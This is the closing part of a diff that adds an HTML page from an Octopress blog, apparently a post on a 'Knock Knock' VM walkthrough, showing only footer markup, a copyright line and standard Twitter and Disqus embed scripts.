+  <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+</section>
+
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Knapsy -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'knapsysbraindump';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://blog.knapsy.com/blog/2014/10/16/knock-knock-vm-walkthrough/';
+        var disqus_url = 'http://blog.knapsy.com/blog/2014/10/16/knock-knock-vm-walkthrough/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
